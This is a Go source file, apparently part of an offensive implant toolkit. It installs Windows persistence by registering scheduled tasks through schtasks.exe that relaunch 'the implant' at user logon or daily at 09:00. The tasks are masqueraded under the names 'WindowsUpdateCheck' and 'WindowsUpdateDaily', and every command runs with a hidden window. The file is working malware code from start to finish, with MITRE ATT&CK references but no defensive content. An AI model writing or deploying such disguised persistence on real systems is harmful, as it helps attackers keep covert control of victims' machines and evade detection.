//go:build windows
// +build windows

// persistence_schtasks.go - Scheduled Task persistence
// Reference: MITRE ATT&CK T1053.005 (Scheduled Task)
//
// Creates a scheduled task using Windows Task Scheduler to execute
// the implant on specified triggers (logon, startup, etc.).
//
// Note: This file is a standalone snippet for reference. The persistence.py
// module generates this code dynamically for template injection.

package main

import (
	"os"
	"os/exec"
	"syscall"
)

// installScheduledTaskPersistence creates a scheduled task for persistence.
// Reference: MITRE ATT&CK T1053.005 (Scheduled Task)
func installScheduledTaskPersistence() error {
	exePath, err := os.Executable()
	if err != nil {
		return err // Silent failure, continue execution
	}

	// Build schtasks command
	// /SC ONLOGON - trigger on user logon
	// /TN <name> - task name
	// /TR <path> - task action (run our binary)
	// /F - force create (overwrite if exists)
	cmd := exec.Command(
		"schtasks.exe",
		"/Create",
		"/SC", "ONLOGON",
		"/TN", "WindowsUpdateCheck",
		"/TR", exePath,
		"/F",
	)

	// Run silently with hidden window
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	err = cmd.Run()
	if err != nil {
		return err
	}

	return nil
}

// installScheduledTaskPersistenceDaily creates a daily scheduled task.
// Alternative trigger for more frequent execution.
func installScheduledTaskPersistenceDaily() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	cmd := exec.Command(
		"schtasks.exe",
		"/Create",
		"/SC", "DAILY",
		"/TN", "WindowsUpdateDaily",
		"/TR", exePath,
		"/ST", "09:00",
		"/F",
	)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

// removeScheduledTaskPersistence removes the scheduled task.
func removeScheduledTaskPersistence() error {
	cmd := exec.Command("schtasks.exe", "/Delete", "/TN", "WindowsUpdateCheck", "/F")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}
